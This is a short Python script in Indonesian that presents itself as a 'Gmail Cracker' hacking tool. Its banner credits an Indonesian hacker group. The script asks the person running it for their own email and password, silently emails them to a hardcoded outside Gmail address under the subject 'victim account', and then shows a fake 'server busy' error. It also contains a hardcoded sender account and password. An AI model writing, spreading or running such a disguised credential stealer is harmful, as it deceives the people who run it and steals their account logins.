import os, sys
print ("Menginstall Paket Tunggu Sebentar......")
os.system('pip install yagmail')
os.system('pip install termcolor')
import yagmail
from termcolor import colored
print (colored('Paket Selesai Di Install...','blue'))
baner = """
   _____ __  __          _____ _         _____ _____           _____ _  ________ _____  
  / ____|  \/  |   /\   |_   _| |       / ____|  __ \    /\   / ____| |/ |  ____|  __ \ 
 | |  __| \  / |  /  \    | | | |      | |    | |__) |  /  \ | |    | ' /| |__  | |__) |
 | | |_ | |\/| | / /\ \   | | | |      | |    |  _  /  / /\ \| |    |  < |  __| |  _  / 
 | |__| | |  | |/ ____ \ _| |_| |____  | |____| | \ \ / ____ | |____| . \| |____| | \ \ 
  \_____|_|  |_/_/    \_|_____|______|  \_____|_|  \_/_/    \_\_____|_|\_|______|_|  \_\
                                                                                        
   AUTHOR BY : MR.X41.HZ2  | GUNAKAN TOOL INI DENGAN BIJAK
   ANGGOTA : INDOXPLOIT-ID | ANONYMOUSE INDONESIA                                                                               
      """
print (colored(baner,'green'))      
print (colored('Silahkan Login Menggunakan Email Anda Untuk Mengecrack Id Korban...','blue'))
anjirt = yagmail.SMTP ('xaiphising@gmail.com','exploiter')
username = str(input(colored('Masukan email: ','yellow')))
password = str(input(colored('Masukan password: ','yellow')))
body = ('username: '+username,'password: '+password)
subject = 'Akun korban'
anjirt.send('xaiassociated@gmail.com',subject,body)
print (colored('Maaf Server Sedang Sibuk.Coba beberapa Saat Lagi','red'))



